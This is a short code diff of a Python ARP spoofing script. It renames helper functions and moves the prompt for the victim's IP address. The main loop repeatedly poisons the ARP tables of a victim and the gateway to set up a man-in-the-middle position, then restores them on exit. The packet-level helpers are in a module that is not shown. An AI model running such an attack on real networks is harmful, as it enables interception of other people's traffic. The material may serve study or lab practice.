@@ -1,9 +1,7 @@
 import time
-from helper import *
+from functions import *
 
-victim_ip = input("Enter victim's IP address: ")
-
-def spoofing(victim_ip, output = False):
+def arp_spoofing(victim_ip, output = False):
     """
     Performs the ARP spoofing attack
     The function should be executed during the attack,
@@ -29,10 +27,10 @@ def spoofing(victim_ip, output = False):
     try:
         while True:
             # Step 1
-            spoof(victim_ip, gateway, output)
+            modify_arp_table(victim_ip, gateway, output)
 
             # Step 2
-            spoof(gateway, victim_ip, output)
+            modify_arp_table(gateway, victim_ip, output)
 
             packets_count += 2
             print(f"\n[+] Packets sent: {packets_count}", end="")
@@ -43,11 +41,12 @@ def spoofing(victim_ip, output = False):
         print("\n Reseting ARP tables. Please wait...")
         
         # Step 4
-        restore(victim_ip, gateway, output)
+        restore_arp_table(victim_ip, gateway, output)
 
         # Step 5
-        restore(gateway, victim_ip, output)
+        restore_arp_table(gateway, victim_ip, output)
 
         print("\n ARP tables restored.")
         
-spoofing(victim_ip, False)
+victim_ip = input("Enter victim's IP address: ")
+arp_spoofing(victim_ip, False)
